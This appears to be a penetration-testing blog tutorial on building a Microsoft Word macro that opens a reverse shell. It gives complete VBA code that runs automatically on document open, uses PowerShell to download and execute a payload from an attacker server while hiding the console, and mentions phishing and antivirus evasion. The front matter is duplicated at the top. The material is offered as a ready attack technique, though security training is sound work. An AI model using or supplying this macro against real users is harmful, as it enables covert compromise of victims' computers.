---
title: "How To Make A Reverse Shell With Microsoft Word Macros"
layout: single
read_time: true
comments: true
share: true
author_profile: true
header:
  overlay_color: "#000"
  overlay_filter: "0.5"
  overlay_image: /assets/christopher-burns-Kj2SaNHG-hg-unsplash.jpg
excerpt: "<br><br><br>"
categories:
  - Tutorials
tags:
  - cyber security
  - penetration testing
  - oscp
---

## High Level

---
title: "How To Make A Reverse Shell With Microsoft Word Macros"
layout: single
read_time: true
comments: true
share: true
author_profile: true
header:
  overlay_color: "#000"
  overlay_filter: "0.5"
  overlay_image: /assets/christopher-burns-Kj2SaNHG-hg-unsplash.jpg
excerpt: "<br><br><br>"
categories:
  - Tutorials
tags:
  - cyber security
  - penetration testing
  - oscp
---

## High Level

By leveraging VBA code in a macro inside of a Microsoft Word document we can leverage Windows APIs to do a lot of functionality like open and run commands in command prompt. The user must enable both editing mode and macros or else Microsoft Word will not let command prompt run our reverse shell. We will use some tips and tricks like making sure command prompt does not open visually, making the macro actually run without the user having to do anything but enable it, and it a future post running our payload in memory to leave no trace.

## Microsoft Word Setup

You will obviously need to have Word already installed and able to be ran. While this post will not go into the phishing tactics that also must be involved for a succesful user to allow our document access a future post most absolutely will. Once inside our word document we need to navigate to the Macros section by going to View --> Macros. Once the Macros window pops up we must choose what document to apply this to. You can either select the name of your document or, for a currently unnamed docuement, select "Document1 (document)". If we do not select the current docuement it will default to adding this to our global template. After selecting our current document we must name the macro. Most online tutorials call their macro "MyMacro" but any naming convention here will work. This is also another moment to employ phishing tactics as a more educated user might want to inspect what macros are being ran. Once the macro is named the VBA editor will launch.

Here is the complete macro below. We will work through the macro top to bottom to make sure we understand what is happening.

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/reverseshell.exe', 'reverseshell.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\reverseshell.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```


## Macro Explained

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

Are redundant options make making the user run our macro since they might not do this willingly or become highly confused with written instruction. They are both there for scenarios where one might not trigger but they both accomplish the same goal.


```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/reverseshell.exe', 'reverseshell.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\reverseshell.exe"
    Wait (2)
    Shell exePath, vbHide
```


This is the heart of the exploit and also where you should adjust your ip address and file name accordingly. To launch the Shell function we need both the exePath and str variables defined; which you can see them as so above. ActiveDocument.Path is used since the powershell download will not go to the normal downloads folder but inside of Word. After each of these shell commands you may notice the vbHide attribute. As one might guess, this hides the command prompts being run from showing allowing the illusion to the user that nothing malicious is happening in the background.


```
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
```


We skipped over the Wait (2) command in the paragraph above as it is not as simple as it looks. VBA does not have a built in wait function so instead we have create our own function that does just that. In the end, whatever number you put in Wait (#) will make the program stall for that many seconds. Remember what is happening: we are reaching out to our own server to download the reverse shell. Due to poor internet connection it is possible that the payload is not fully downloaded by the time the macro reaches the execution part and could end up causing a false negative. By including this wait function we give the program ample time to download our payload for execution.

## Saving The File

While you might be tempted to save this as the modern .docx format this will actually stop this from working. Instead, we need to use the much older but still in use .doc Word file extension to make sure our macros are kept with the file.

## Wrap up

In the blog we did not go over how to craft a msfvenom reverse shell. However, I will have blog post coming out soon and will link it here. Additionally, this technique does not practice the best techniques by downling the reverse shell instead of loading and running it in memory. There will also be a blog post comming on this soon and I will link it here. This next step of loading the payload in memory is highly encouraged as many anti virus programs will easily catch or reverse shell or throw up other errors when trying to execute it.
